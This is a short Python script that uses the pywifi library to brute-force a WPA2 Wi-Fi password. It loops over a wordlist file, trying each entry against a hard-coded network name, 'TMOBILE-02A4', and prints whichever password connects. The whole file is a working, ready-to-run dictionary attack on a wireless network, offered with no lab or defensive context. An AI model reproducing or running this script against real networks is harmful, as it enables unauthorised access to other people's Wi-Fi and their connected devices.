import pywifi
import time
from pywifi import const
import sys

wifi = pywifi.PyWiFi()
ifaces = wifi.interfaces()
if not ifaces:
    print("No wireless interfaces found.")
    sys.exit(1)

iface = ifaces[0]
iface.disconnect()
time.sleep(2)
print("Disconnecting from current network...")

if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
    print("Disconnected from current network. Ready to configure new connection.")
else:
    print("Failed to disconnect.")
    sys.exit(1)

wordlist_path = 'password.txt'
try:
    with open(wordlist_path, 'r', encoding='utf-8') as file:
        passwords = [line.strip() for line in file if line.strip()]
        if not passwords:
            print("No passwords found in wordlist.")
            sys.exit(1)
except FileNotFoundError:
    print(f"Wordlist not found: {wordlist_path}")
    sys.exit(1)

ssid = "TMOBILE-02A4"
for password in passwords:
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
        print(f"Connected successfully with password: {password}")
        break
    else:
        print(f"Failed with password: {password}")
        iface.disconnect()
        time.sleep(1)
else:
    print("No valid password found in wordlist.") 